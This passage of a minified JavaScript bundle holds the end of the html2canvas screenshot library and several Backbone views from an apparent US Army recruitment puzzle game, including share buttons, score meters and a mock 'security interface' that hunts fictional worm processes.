a,r,o=rt.createElement("valuewrap"),i=["lineHeight","textAlign","fontFamily","color","fontSize","paddingLeft","paddingTop","width","height","border","borderLeftWidth","borderTopWidth"];i.forEach(function(e){try{o.style[e]=ct(t,e)}catch(n){ot.log("html2canvas: Parse: Exception caught in renderFormValue: "+n.message)}}),o.style.borderColor="black",o.style.borderStyle="solid",o.style.display="block",o.style.position="absolute",(/^(submit|reset|button|text|password)$/.test(t.type)||"SELECT"===t.nodeName)&&(o.style.lineHeight=ct(t,"height")),o.style.top=e.top+"px",o.style.left=e.left+"px",a="SELECT"===t.nodeName?(t.options[t.selectedIndex]||0).text:t.value,a||(a=t.placeholder),r=rt.createTextNode(a),o.appendChild(r),st.appendChild(o),p(t,r,n),st.removeChild(o)}function A(t){t.drawImage.apply(t,Array.prototype.slice.call(arguments,1)),at+=1}function U(t,e){var n=window.getComputedStyle(t,e);if(n&&n.content&&"none"!==n.content&&"-moz-alt-content"!==n.content&&"none"!==n.display){var a=n.content+"",r=a.substr(0,1);r===a.substr(a.length-1)&&r.match(/'|"/)&&(a=a.substr(1,a.length-2));var o="url"===a.substr(0,3),i=document.createElement(o?"img":"span");return i.className=dt+"-before "+dt+"-after",Object.keys(n).filter(N).forEach(function(t){try{i.style[t]=n[t]}catch(e){ot.log(["Tried to assign readonly property ",t,"Error:",e])}}),o?i.src=ot.parseBackgroundImage(a)[0].args[0]:i.innerHTML=a,i}}function N(t){return isNaN(window.parseInt(t,10))}function P(t,e){var n=U(t,":before"),a=U(t,":after");(n||a)&&(n&&(t.className+=" "+dt+"-before",t.parentNode.insertBefore(n,t),Z(n,e,!0),t.parentNode.removeChild(n),t.className=t.className.replace(dt+"-before","").trim()),a&&(t.className+=" "+dt+"-after",t.appendChild(a),Z(a,e,!0),t.removeChild(a),t.className=t.className.replace(dt+"-after","").trim()))}function F(t,e,n,a){var r=Math.round(a.left+n.left),o=Math.round(a.top+n.top);t.createPattern(e),t.translate(r,o),t.fill(),t.translate(-r,-o)}function V(t,e,n,a,r,o,i,l){var s=[];s.push(["line",Math.round(r),Math.round(o)]),s.push(["line",Math.round(r+i),Math.round(o)]),s.push(["line",Math.round(r+i),Math.round(l+o)]),s.push(["line",Math.round(r),Math.round(l+o)]),O(t,s),t.save(),t.clip(),F(t,e,n,a),t.restore()}function D(t,e,n){o(t,e.left,e.top,e.width,e.height,n)}function $(t,e,n,a,r){var o=ot.BackgroundSize(t,e,a,r),i=ot.BackgroundPosition(t,e,a,r,o),l=ct(t,"backgroundRepeat").split(",").map(ot.trimText);switch(a=W(a,o),l=l[r]||l[0]){case"repeat-x":V(n,a,i,e,e.left,e.top+i.top,99999,a.height);break;case"repeat-y":V(n,a,i,e,e.left+i.left,e.top,a.width,99999);break;case"no-repeat":V(n,a,i,e,e.left+i.left,e.top+i.top,a.width,a.height);break;default:F(n,a,i,{top:e.top,left:e.left,width:a.width,height:a.height})}}function G(t,e,n){for(var a,r=ct(t,"backgroundImage"),o=ot.parseBackgroundImage(r),i=o.length;i--;)if(r=o[i],r.args&&0!==r.args.length){var l="url"===r.method?r.args[0]:r.value;a=b(l),a?$(t,e,n,a,i):ot.log("html2canvas: Error loading background:",r)}}function W(t,e){if(t.width===e.width&&t.height===e.height)return t;var n,a=rt.createElement("canvas");return a.width=e.width,a.height=e.height,n=a.getContext("2d"),A(n,t,0,0,t.width,t.height,0,0,e.width,e.height),a}function H(t,e,n){return t.setVariable("globalAlpha",ct(e,"opacity")*(n?n.opacity:1))}function X(t){return t.replace("px","")}function j(t,e){var n=ct(t,"transform")||ct(t,"-webkit-transform")||ct(t,"-moz-transform")||ct(t,"-ms-transform")||ct(t,"-o-transform"),a=ct(t,"transform-origin")||ct(t,"-webkit-transform-origin")||ct(t,"-moz-transform-origin")||ct(t,"-ms-transform-origin")||ct(t,"-o-transform-origin")||"0px 0px";a=a.split(" ").map(X).map(ot.asFloat);var r;if(n&&"none"!==n){var o=n.match(ft);if(o)switch(o[1]){case"matrix":r=o[2].split(",").map(ot.trimText).map(ot.asFloat)}}return{origin:a,matrix:r}}function q(t,r,o,i){var l=h2cRenderContext(r?o.width:n(),r?o.height:a()),s={ctx:l,opacity:H(l,t,r),cssPosition:ct(t,"position"),borders:T(t),transform:i,clip:r&&r.clip?ot.Extend({},r.clip):null};return k(t,s,r),e.useOverflow===!0&&/(hidden|scroll|auto)/.test(ct(t,"overflow"))===!0&&/(BODY)/i.test(t.nodeName)===!1&&(s.clip=s.clip?x(s.clip,o):o),s}function Y(t,e,n){var a={left:e.left+t[3].width,top:e.top+t[0].width,width:e.width-(t[1].width+t[3].width),height:e.height-(t[0].width+t[2].width)};return n&&(a=x(a,n)),a}function Q(t,e){var n=e.matrix?ot.OffsetBounds(t):ot.Bounds(t);return e.origin[0]+=n.left,e.origin[1]+=n.top,n}function J(t,e,n,a){var r,o=j(t,e),i=Q(t,o),l=q(t,e,i,o),s=l.borders,c=l.ctx,d=Y(s,i,l.clip),h=L(t,i,s),u=lt.test(t.nodeName)?"#efefef":ct(t,"backgroundColor");switch(O(c,h.clip),c.save(),c.clip(),d.height>0&&d.width>0&&!a?(D(c,i,u),G(t,d,c)):a&&(l.backgroundColor=u),c.restore(),h.borders.forEach(function(t){z(c,t.args,t.color)}),n||P(t,l),t.nodeName){case"IMG":(r=b(t.getAttribute("src")))?C(c,t,r,i,s):ot.log("html2canvas: Error loading <img>:"+t.getAttribute("src"));break;case"INPUT":/^(text|url|email|submit|button|reset)$/.test(t.type)&&(t.value||t.placeholder||"").length>0&&B(t,i,l);break;case"TEXTAREA":(t.value||t.placeholder||"").length>0&&B(t,i,l);break;case"SELECT":(t.options||t.placeholder||"").length>0&&B(t,i,l);break;case"LI":y(t,l,d);break;case"CANVAS":C(c,t,t,i,s)}return l}function K(t){return"none"!==ct(t,"display")&&"hidden"!==ct(t,"visibility")&&!t.hasAttribute("data-html2canvas-ignore")}function Z(t,e,n){K(t)&&(e=J(t,e,n,!1)||e,lt.test(t.nodeName)||tt(t,e,n))}function tt(t,e,n){ot.Children(t).forEach(function(a){a.nodeType===a.ELEMENT_NODE?Z(a,e,n):a.nodeType===a.TEXT_NODE&&p(t,a,e)})}function et(){var t=ct(document.documentElement,"backgroundColor"),e=ot.isTransparent(t)&&nt===document.body,n=J(nt,null,!1,e);return tt(nt,n),e&&(t=n.backgroundColor),st.removeChild(ht),{backgroundColor:t,stack:n}}window.scroll(0,0);var nt=void 0===e.elements?document.body:e.elements[0],at=0,rt=nt.ownerDocument,ot=_html2canvas.Util,it=ot.Support(e,rt),lt=new RegExp("("+e.ignoreElements+")"),st=rt.body,ct=ot.getCSS,dt="___html2canvas___pseudoelement",ht=rt.createElement("style");ht.innerHTML="."+dt+'-before:before { content: "" !important; display: none !important; }.'+dt+'-after:after { content: "" !important; display: none !important; }',st.appendChild(ht),t=t||{};var ut=function(t){return function(e,n,a,r){var o=a*t,i=r*t,l=e+a,s=n+r;return{topLeft:R({x:e,y:s},{x:e,y:s-i},{x:l-o,y:n},{x:l,y:n}),topRight:R({x:e,y:n},{x:e+o,y:n},{x:l,y:s-i},{x:l,y:s}),bottomRight:R({x:l,y:n},{x:l,y:n+i},{x:e+o,y:s},{x:e,y:s}),bottomLeft:R({x:l,y:s},{x:l-o,y:s},{x:e,y:n+i},{x:e,y:n})}}}(4*((Math.sqrt(2)-1)/3)),ft=/(matrix)\((.+)\)/;return et()},_html2canvas.Preload=function(t){function e(t){k.href=t,k.href=k.href;var e=k.protocol+k.host;return e===h}function n(){g.log("html2canvas: start: images: "+p.numLoaded+" / "+p.numTotal+" (failed: "+p.numFailed+")"),!p.firstRun&&p.numLoaded>=p.numTotal&&(g.log("Finished loading images: # "+p.numTotal+" (failed: "+p.numFailed+")"),"function"==typeof t.complete&&t.complete(p))}function a(e,a,r){var o,i,l=t.proxy;k.href=e,e=k.href,o="html2canvas_"+w++,r.callbackname=o,l+=l.indexOf("?")>-1?"&":"?",l+="url="+encodeURIComponent(e)+"&callback="+o,i=y.createElement("script"),window[o]=function(t){"error:"===t.substring(0,6)?(r.succeeded=!1,p.numLoaded++,p.numFailed++,n()):(d(a,r),a.src=t),window[o]=void 0;try{delete window[o]}catch(e){}i.parentNode.removeChild(i),i=null,delete r.script,delete r.callbackname},i.setAttribute("type","text/javascript"),i.setAttribute("src",l),r.script=i,window.document.body.appendChild(i)}function r(t,e){var n=window.getComputedStyle(t,e),a=n.content;"url"===a.substr(0,3)&&u.loadImage(_html2canvas.Util.parseBackgroundImage(a)[0].args[0]),s(n.backgroundImage,t)}function o(t){r(t,":before"),r(t,":after")}function i(t,e){var a=_html2canvas.Generate.Gradient(t,e);void 0!==a&&(p[t]={img:a,succeeded:!0},p.numTotal++,p.numLoaded++,n())}function l(t){return t&&t.method&&t.args&&t.args.length>0}function s(t,e){var n;_html2canvas.Util.parseBackgroundImage(t).filter(l).forEach(function(t){"url"===t.method?u.loadImage(t.args[0]):t.method.match(/\-?gradient$/)&&(void 0===n&&(n=_html2canvas.Util.Bounds(e)),i(t.value,n))})}function c(t){var e=!1;try{g.Children(t).forEach(c)}catch(n){}try{e=t.nodeType}catch(a){e=!1,g.log("html2canvas: failed to access some element's nodeType - Exception: "+a.message)}if(1===e||void 0===e){o(t);try{s(g.getCSS(t,"backgroundImage"),t)}catch(n){g.log("html2canvas: failed to get background-image - Exception: "+n.message)}s(t)}}function d(e,r){e.onload=function(){void 0!==r.timer&&window.clearTimeout(r.timer),p.numLoaded++,r.succeeded=!0,e.onerror=e.onload=null,n()},e.onerror=function(){if("anonymous"===e.crossOrigin&&(window.clearTimeout(r.timer),t.proxy)){var o=e.src;return e=new Image,r.img=e,e.src=o,void a(e.src,e,r)}p.numLoaded++,p.numFailed++,r.succeeded=!1,e.onerror=e.onload=null,n()}}var h,u,f,m,p={numLoaded:0,numFailed:0,numTotal:0,cleanupDone:!1},g=_html2canvas.Util,w=0,v=t.elements[0]||document.body,y=v.ownerDocument,b=v.getElementsByTagName("img"),x=b.length,k=y.createElement("a"),C=function(t){return void 0!==t.crossOrigin}(new Image);for(k.href=window.location.href,h=k.protocol+k.host,u={loadImage:function(n){var r,o;n&&void 0===p[n]&&(r=new Image,n.match(/data:image\/.*;base64,/i)?(r.src=n.replace(/url\(['"]{0,}|['"]{0,}\)$/gi,""),o=p[n]={img:r},p.numTotal++,d(r,o)):e(n)||t.allowTaint===!0?(o=p[n]={img:r},p.numTotal++,d(r,o),r.src=n):C&&!t.allowTaint&&t.useCORS?(r.crossOrigin="anonymous",o=p[n]={img:r},p.numTotal++,d(r,o),r.src=n):t.proxy&&(o=p[n]={img:r},p.numTotal++,a(n,r,o)))},cleanupDOM:function(e){var a,r;if(!p.cleanupDone){e&&"string"==typeof e?g.log("html2canvas: Cleanup because: "+e):g.log("html2canvas: Cleanup after timeout: "+t.timeout+" ms.");for(r in p)if(p.hasOwnProperty(r)&&(a=p[r],"object"==typeof a&&a.callbackname&&void 0===a.succeeded)){window[a.callbackname]=void 0;
try{delete window[a.callbackname]}catch(o){}a.script&&a.script.parentNode&&(a.script.setAttribute("src","about:blank"),a.script.parentNode.removeChild(a.script)),p.numLoaded++,p.numFailed++,g.log("html2canvas: Cleaned up failed img: '"+r+"' Steps: "+p.numLoaded+" / "+p.numTotal)}void 0!==window.stop?window.stop():void 0!==document.execCommand&&document.execCommand("Stop",!1),void 0!==document.close&&document.close(),p.cleanupDone=!0,e&&"string"==typeof e||n()}},renderingDone:function(){m&&window.clearTimeout(m)}},t.timeout>0&&(m=window.setTimeout(u.cleanupDOM,t.timeout)),g.log("html2canvas: Preload starts: finding background-images"),p.firstRun=!0,c(v),g.log("html2canvas: Preload: Finding images"),f=0;x>f;f+=1)u.loadImage(b[f].getAttribute("src"));return p.firstRun=!1,g.log("html2canvas: Preload: Done."),p.numTotal===p.numLoaded&&n(),u},_html2canvas.Renderer=function(t,e){function n(t){function e(t){Object.keys(t).sort().forEach(function(n){var r=[],o=[],i=[],l=[];t[n].forEach(function(t){t.node.zIndex.isPositioned||t.node.zIndex.opacity<1?i.push(t):t.node.zIndex.isFloated?o.push(t):r.push(t)}),function s(t){t.forEach(function(t){l.push(t),t.children&&s(t.children)})}(r.concat(o,i)),l.forEach(function(t){t.context?e(t.context):a.push(t.node)})})}var n,a=[];return n=function(t){function e(t,n,a){var r="auto"===n.zIndex.zindex?0:Number(n.zIndex.zindex),o=t,i=n.zIndex.isPositioned,l=n.zIndex.isFloated,s={node:n},c=a;n.zIndex.ownStacking?(o=s.context={"!":[{node:n,children:[]}]},c=void 0):(i||l)&&(c=s.children=[]),0===r&&a?a.push(s):(t[r]||(t[r]=[]),t[r].push(s)),n.zIndex.children.forEach(function(t){e(o,t,c)})}var n={};return e(n,t),n}(t),e(n),a}function a(t){var n;if("string"==typeof e.renderer&&void 0!==_html2canvas.Renderer[t])n=_html2canvas.Renderer[t](e);else{if("function"!=typeof t)throw new Error("Unknown renderer");n=t(e)}if("function"!=typeof n)throw new Error("Invalid renderer defined");return n}return a(e.renderer)(t,e,document,n(t.stack),_html2canvas)},_html2canvas.Util.Support=function(t,e){function n(){var t=new Image,n=e.createElement("canvas"),a=void 0===n.getContext?!1:n.getContext("2d");if(a===!1)return!1;n.width=n.height=10,t.src=["data:image/svg+xml,","<svg xmlns='http://www.w3.org/2000/svg' width='10' height='10'>","<foreignObject width='10' height='10'>","<div xmlns='http://www.w3.org/1999/xhtml' style='width:10;height:10;'>","sup","</div>","</foreignObject>","</svg>"].join("");try{a.drawImage(t,0,0),n.toDataURL()}catch(r){return!1}return _html2canvas.Util.log("html2canvas: Parse: SVG powered rendering available"),!0}function a(){var t,n,a,r,o=!1;return e.createRange&&(t=e.createRange(),t.getBoundingClientRect&&(n=e.createElement("boundtest"),n.style.height="123px",n.style.display="block",e.body.appendChild(n),t.selectNode(n),a=t.getBoundingClientRect(),r=a.height,123===r&&(o=!0),e.body.removeChild(n))),o}return{rangeBounds:a(),svgRendering:t.svgRendering&&n()}},window.html2canvas=function(t,e){t=t.length?t:[t];var n,a,r={logging:!1,elements:t,background:"#fff",proxy:null,timeout:0,useCORS:!1,allowTaint:!1,svgRendering:!1,ignoreElements:"IFRAME|OBJECT|PARAM",useOverflow:!0,letterRendering:!1,chinese:!1,width:null,height:null,taintTest:!0,renderer:"Canvas"};return r=_html2canvas.Util.Extend(e,r),_html2canvas.logging=r.logging,r.complete=function(t){("function"!=typeof r.onpreloaded||r.onpreloaded(t)!==!1)&&(n=_html2canvas.Parse(t,r),("function"!=typeof r.onparsed||r.onparsed(n)!==!1)&&(a=_html2canvas.Renderer(n,r),"function"==typeof r.onrendered&&r.onrendered(a)))},window.setTimeout(function(){_html2canvas.Preload(r)},0),{render:function(t,e){return _html2canvas.Renderer(t,_html2canvas.Util.Extend(e,r))},parse:function(t,e){return _html2canvas.Parse(t,_html2canvas.Util.Extend(e,r))},preload:function(t){return _html2canvas.Preload(_html2canvas.Util.Extend(t,r))},log:_html2canvas.Util.log}},window.html2canvas.log=_html2canvas.Util.log,window.html2canvas.Renderer={Canvas:void 0},_html2canvas.Renderer.Canvas=function(t){function e(t,e){t.beginPath(),e.forEach(function(e){t[e.name].apply(t,e.arguments)}),t.closePath()}function n(t){if(-1===o.indexOf(t.arguments[0].src)){l.drawImage(t.arguments[0],0,0);try{l.getImageData(0,0,1,1)}catch(e){return i=r.createElement("canvas"),l=i.getContext("2d"),!1}o.push(t.arguments[0].src)}return!0}function a(a,r){switch(r.type){case"variable":a[r.name]=r.arguments;break;case"function":switch(r.name){case"createPattern":if(r.arguments[0].width>0&&r.arguments[0].height>0)try{a.fillStyle=a.createPattern(r.arguments[0],"repeat")}catch(o){s.log("html2canvas: Renderer: Error creating pattern",o.message)}break;case"drawShape":e(a,r.arguments);break;case"drawImage":r.arguments[8]>0&&r.arguments[7]>0&&(!t.taintTest||t.taintTest&&n(r))&&a.drawImage.apply(a,r.arguments);break;default:a[r.name].apply(a,r.arguments)}}}t=t||{};var r=document,o=[],i=document.createElement("canvas"),l=i.getContext("2d"),s=_html2canvas.Util,c=t.canvas||r.createElement("canvas");return function(t,e,n,r,o){var i,l,d,h=c.getContext("2d"),u=t.stack;return c.width=c.style.width=e.width||u.ctx.width,c.height=c.style.height=e.height||u.ctx.height,d=h.fillStyle,h.fillStyle=s.isTransparent(u.backgroundColor)&&void 0!==e.background?e.background:t.backgroundColor,h.fillRect(0,0,c.width,c.height),h.fillStyle=d,r.forEach(function(t){h.textBaseline="bottom",h.save(),t.transform.matrix&&(h.translate(t.transform.origin[0],t.transform.origin[1]),h.transform.apply(h,t.transform.matrix),h.translate(-t.transform.origin[0],-t.transform.origin[1])),t.clip&&(h.beginPath(),h.rect(t.clip.left,t.clip.top,t.clip.width,t.clip.height),h.clip()),t.ctx.storage&&t.ctx.storage.forEach(function(t){a(h,t)}),h.restore()}),s.log("html2canvas: Renderer: Canvas renderer done - returning canvas obj"),1===e.elements.length&&"object"==typeof e.elements[0]&&"BODY"!==e.elements[0].nodeName?(l=o.Util.Bounds(e.elements[0]),i=n.createElement("canvas"),i.width=Math.ceil(l.width),i.height=Math.ceil(l.height),h=i.getContext("2d"),h.drawImage(c,l.left,l.top,l.width,l.height,0,0,l.width,l.height),c=null,i):c}},module.exports=_html2canvas;
},{}],62:[function(require,module,exports){
var BaseView=require("views/base-view"),textFlicker=require("shared/utils/text-flicker"),analytics=require("shared/analytics"),ns=require("shared/namespace"),AboutMain=BaseView.extend({template:"about",className:"section about",initialize:function(){},enter:function(){this.render({}),this.$(".content").perfectScrollbar(),ns.audioProxy.triggerEvent("about_start"),this.$el.css({opacity:0,display:"block"}),this.$el.removeClass("fade-out").addClass("fade-in"),textFlicker(this.$("h1")[0],{delay:1}),textFlicker(this.$("h1")[1],{delay:1})},exit:function(e){ns.audioProxy.triggerEvent("about_stop"),this.$el.removeClass("fade-in").addClass("fade-out"),setTimeout(function(){"function"==typeof e&&e()}.bind(this),300)},events:{"click .job":"onClickJob","click .about-block .go-army-btn":"onClickArmyAboutBtn","click .jobs-block .go-army-btn":"onClickArmyJobsBtn","mouseenter .job":"onMouseEnter","mouseenter .about-block .go-army-btn":"onMouseEnter","mouseenter .jobs-block .go-army-btn":"onMouseEnter"},onMouseEnter:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.ABOUT_ROLL_OVER)},onClickJob:function(e){analytics.trackEvent("click","job",$(e.currentTarget).find(".label").html()),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.ABOUT_CLICK)},onClickArmyAboutBtn:function(){analytics.trackEvent("click","learn more"),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.ABOUT_CLICK)},onClickArmyJobsBtn:function(){analytics.trackEvent("click","more jobs","about"),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.ABOUT_CLICK)}});module.exports=AboutMain;
},{"shared/analytics":107,"shared/namespace":140,"shared/utils/text-flicker":224,"views/base-view":63}],63:[function(require,module,exports){
var namespace=require("shared/namespace"),BaseView=Backbone.View.extend({render:function(e){var t=namespace.templates[this.template];if(this.el=this.$el[0],t){var i=e||{};this.$el.html(t(i))}else console.warn("no template for this view:",this.template)},enter:function(e){this.$el.show(),e()},exit:function(e){this.$el.hide(),e()},destroy:function(){this.remove()}});module.exports=BaseView;
},{"shared/namespace":140}],64:[function(require,module,exports){
var BaseView=require("views/base-view");module.exports=BaseView.extend({template:"esi",className:"esi",worms:null,searchDepthLimit:10,rawCommandKeyLog:[],rawCommands:[],initialize:function(i){_.extend(this,i),this.worms={},this.render(),this.parent.append(this.$el),window.esi=this},prepareCLI:function(){console.log("preparing ESI CLI"),this.rawCommands.push({code:[56,48,50],fn:function(){this.handleRawCommand(802)}.bind(this)}),this.$("input.command").on("keyup",this.handleKeyUp.bind(this)),$(document).on("keyup",function(i){this.rawCommandKeyLog.push(i.keyCode),_.isEqual(this.rawCommandKeyLog,this.rawCommands[0].code)&&this.rawCommands[0].fn(),setTimeout(function(){this.rawCommandKeyLog=[]}.bind(this),1e3)}.bind(this)),this.log("EMERGENCY SECURITY INTERFACE Initialized on "+Math.round(1e6*Math.random())+"."),this.log('type "--help" for available commands.'),this.log("ESI living at app root on _security.")},handleRawCommand:function(i){Object.keys(this.worms).forEach(function(e){this.worms[e].channel===i&&this.worms[e].worm.logger.enable()}.bind(this))},beginScan:function(){this.interval=setInterval(this.scan.bind(this),5e3),this.scan()},scan:function(){console.log("security scanning");var i,e=!1,n=function(t,s){i=!1,setTimeout(function(){i||e||(e=!0)},400),Object.keys(t).forEach(function(e){t[e]&&"object"==typeof t[e]&&"panic"===t[e].signature&&(this.openESI(),this.foundWorm(t[e])),t[e]&&"object"==typeof t[e]&&Object.keys(t[e]).length&&(s++,s<this.searchDepthLimit&&(i=!0,n(t[e],s)))}.bind(this))}.bind(this);n(this.app,0)},foundWorm:function(i){var e=!1;if(Object.keys(this.worms).forEach(function(n){this.worms[n].worm===i&&(e=!0)}.bind(this)),!e){var n="_worm_"+Math.round(1e5*Math.random());this.worms[n]={worm:i,alive:!0,channel:i.channel},this.log("Found malicious process.  Access variable: "+n),setTimeout(function(){this.log("Process logging on: "+i.channel+". Type "+i.channel+" to monitor.")}.bind(this),1100)}},openESI:function(){},log:function(i){},handleKeyUp:function(i){13==i.keyCode&&(this.checkCommand($(i.currentTarget).val()),$(i.currentTarget).val(""))},checkCommand:function(i){var e=i.split(" ")[0];if(!(i.length<1))switch(e){case"--help":this.log('<div class="response">--kill {{process variable}}; : Use this command to kill a living malicious process</div><div class="response">--rebuild : Use this command to rebuild compromised system modules after stabilization</div>');break;case"--kill":this.log("Attempting to kill process: "+i.split(" ")[1]+"...");break;case"--rebuild":this.log("Rebuilding System...");break;default:this.log('<div class="response">command not found...</div>')}},disable:function(){this.log("Security disable called.  Terminating in 4 seconds."),clearInterval(this.interval),setTimeout(function(){this.$el.remove()}.bind(this),4e3)}});
},{"views/base-view":63}],65:[function(require,module,exports){
var BaseView=require("views/base-view"),appModel=require("models/app-model"),footerEvents=appModel.events.FOOTER,user=require("shared/user"),ns=require("shared/namespace"),analytics=require("shared/analytics"),shareURL=window.location.origin,FooterView=BaseView.extend({template:"footer",initialize:function(e){_.extend(this,e),this.render(),this.populateLoginButton(),this.setElement(this.$el),this.listenTo(appModel,footerEvents.SHOW,this.enter),this.listenTo(appModel,footerEvents.HIDE,this.exit),this.listenTo(user,"change:logged_in",this.populateLoginButton),this.listenTo(appModel,"change:muted",this.setMuteState),this.setMuteState()},setMuteState:function(){appModel.get("muted")?this.$(".sound.btn").removeClass("active"):this.$(".sound.btn").addClass("active")},populateLoginButton:function(){this.$(".login-btn").html(user.get("logged_in")?"log out":"log in")},enter:function(e){},exit:function(e){setTimeout(function(){e&&"function"==typeof e&&e()},300)},events:{"click .go-army":"onClickGoarmy","click .twitter-btn":"onClickTwitter","click .facebook-btn":"onClickFacebook","click .gplus-btn":"onClickGPlus","click .login-btn":"onClickLogin","click .sound.btn":"onClickSoundBtn","mouseenter .go-army":"onButtonHover","mouseenter .twitter-btn":"onButtonHover","mouseenter .facebook-btn":"onButtonHover","mouseenter .gplus-btn":"onButtonHover","mouseenter .login-btn":"onButtonHover","mouseenter .sound.btn":"onButtonHover"},onButtonHover:function(){ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.SOCIAL_SHARE_HOVER)},onClickGoarmy:function(){analytics.trackEvent("click","goarmy.com")},onClickTwitter:function(){var e="http://twitter.com/share?";e+="text=An unknown threat is detected and the US Army needs you. Decipher the clues, complete the mission and prove yourself",e+="&url="+shareURL,window.open(e,"_blank","width=400, height=300"),analytics.trackEvent("click","share","twitter"),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.SOCIAL_SHARE_CLICK)},onClickFacebook:function(){var e="https://www.facebook.com/sharer/sharer.php?u=";e+=shareURL,window.open(e,"_blank","width=400, height=300"),analytics.trackEvent("click","share","facebook"),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.SOCIAL_SHARE_CLICK)},onClickGPlus:function(){var e="https://plus.google.com/share?url=";e+=shareURL,window.open(e,"_blank","width=488, height=474"),analytics.trackEvent("click","share","google"),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.SOCIAL_SHARE_CLICK)},onClickLogin:function(){if(user.get("logged_in"))user.logout();else{var e;(null!==window.location.href.match("mission")||null!==window.location.href.match("training"))&&(e="hard"),appModel.trigger(appModel.events.SECTION.CHANGE,{section:"login",type:e})}ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.LOGIN_CLICK)},onClickSoundBtn:function(){console.log("Footer.onClickSoundBtn",!appModel.get("muted"));var e=!appModel.get("muted");e?ns.audioProxy.soundOff():ns.audioProxy.soundOn(),ns.audioProxy.triggerUI(ns.audioProxy.UI_EVENTS.SOCIAL_SHARE_CLICK),appModel.set("muted",e)}});module.exports=FooterView;
},{"models/app-model":46,"shared/analytics":107,"shared/namespace":140,"shared/user":213,"views/base-view":63}],66:[function(require,module,exports){
var BaseView=require("views/base-view"),ns=require("shared/namespace"),textFlicker=require("shared/utils/text-flicker"),GameIntro=BaseView.extend({template:"game-intro",initialize:function(e){console.log("GameIntro.initialize",e),_.extend(this,e),this.setElement(e.$el)},enter:function(){console.log("GameIntro.enter",this),this.render(this),this.$el.removeClass("fade-out").addClass("fade-in"),this.$(".description span, .name .word, .dash-title").css({opacity:0}),this.$(".dash-title").css("visibility","hidden"),setTimeout(function(){this.$(".dash-title").css({visibility:"visible",opacity:1}).addClass("animate-in")}.bind(this),1e3),this.$(".name .word").each(function(){textFlicker(this,{delay:.5})}).css({opacity:1});var e=this.$(".continue");TweenMax.staggerFromTo(this.$(".description span"),.5,{opacity:0},{opacity:1,delay:1.5},.017,function(){e.css("opacity",1)}),ns.audioProxy.triggerEvent("gameintro_start")},exit:function(e){console.log("\n\n	","game-intro.exit"),this.$el.css({opacity:1}).removeClass("fade-in").addClass("fade-out"),setTimeout(function(){"function"==typeof e&&e()},1e3),ns.audioProxy.triggerEvent("gameintro_stop")},events:{"touchstart .continue":"onClickContinue","click .continue":"onClickContinue","mouseenter .continue":"handleMouseOver","mouseleave .continue":"handleMouseOut"},onClickContinue:function(){this.trigger("continue"),ns.audioProxy.triggerEvent("main_click")},handleMouseOver:function(){this.$el.addClass("hovered"),ns.audioProxy.triggerEvent("main_rollover")},handleMouseOut:function(){this.$el.removeClass("hovered")}});module.exports=GameIntro;
},{"shared/namespace":140,"shared/utils/text-flicker":224,"views/base-view":63}],67:[function(require,module,exports){
var BaseView=require("views/base-view"),ScoreMeter=require("views/score-meter"),user=require("shared/user"),audio=require("shared/audioproxy"),util=require("shared/utils/util"),ns=require("shared/namespace"),storage=require("shared/utils/storage"),flickerTransition=require("shared/flickertransition"),size=150,GameResult=BaseView.extend({template:"game-result",initialize:function(e){console.log("GameResult.initialize",e),_.extend(this,e),_.bindAll(this,"onMetersCreated"),this.setElement(e.$el)},enter:function(e,i,t){console.log("GameResult.enter",e,i,t);var n=window.location.hash.split("/").slice(1),r="mission"===n[0],s="training-room"===n[0];ns.audioProxy.triggerEvent("gamecomplete_start"),this.render({title:this.data.config.title,gameNum:util.padInt(2,parseInt(this.data.config.slug[0])+1),wonGame:e,user:user.attributes,isMission:r,isTraining:s,missionEnded:t}),e&&t?user.get("logged_in")?this.createMetersMissionComplete(this.onMetersCreated):this.onMetersCreated([]):e?this.createMetersGameComplete(i,this.onMetersCreated):this.onMetersCreated([])},onMetersCreated:function(e){audio.triggerEvent("score_count_start"),e.forEach(function(e,i){setTimeout(function(){e.show(3.5)},500*i),setTimeout(function(){audio.triggerEvent("score_count_end")},5e3)}),this.$el.css({visibility:"visible"}),this.$el.addClass("fade-in")},createMetersGameComplete:function(e,i){var t=this.$(".score-display"),n=[new ScoreMeter({size:size,$parent:t,max:1e3,value:e.score,label:"score",displayType:"number"}),new ScoreMeter({size:size,$parent:t,max:100,value:100*e.skill,label:"skill"}),new ScoreMeter({size:size,$parent:t,max:100,value:100*e.accuracy,label:"accuracy"}),new ScoreMeter({size:size,$parent:t,max:100,value:100*e.speed,label:"speed"})];i(n)},createMetersMissionComplete:function(e){var i=this.$(".score-display");$.get("/api/mission",function(t){var n=t.missions[0],r=[new ScoreMeter({size:size,$parent:i,max:100,value:100*n.science,label:"Science",displayType:"number"}),new ScoreMeter({size:size,$parent:i,max:100,value:100*n.technology,label:"Technology"}),new ScoreMeter({size:size,$parent:i,max:100,value:100*n.engineering,label:"Engineering"}),new ScoreMeter({size:size,$parent:i,max:100,value:100*n.math,label:"Math"})];e(r)})},exit:function(){this.$el.removeClass("fade-in").addClass("fade-out"),ns.audioProxy.triggerEvent("gamecomplete_stop")},events:{"click .retry":"onClickRetry","touchstart .retry":"onClickRetry","click .next":"onClickNext","touchstart .next":"onClickNext","click .save":"onClickSave","touchstart .save":"onClickSave","click .training":"onClickTraining","touchstart .training":"onClickTraining","mouseover .btn":"handleMouseOver","click .btn":"handleClickButton"},onClickSave:function(){storage.setItem("saving",!0),window.location.hash="!/login"},onClickNext:function(){this.trigger("next")},onClickRetry:function(){flickerTransition("out",function(){"start over"===this.$(".retry").html()?window.location.hash="!/mission":(window.localStorage.setItem("retry",!0),window.location.reload())})},onClickTraining:function(){window.location.hash="!/training-room"},handleMouseOver:function(){ns.audioProxy.triggerEvent("main_rollover")},handleClickButton:function(){ns.audioProxy.triggerEvent("main_click")}});module.exports=GameResult;
},{"shared/audioproxy":108,"shared/flickertransition":112,"shared/namespace":140,"shared/user":213,"shared/utils/storage":223,"shared/utils/util":225,"views/base-view":63,"views/score-meter":83}],68:[function(require,module,exports){
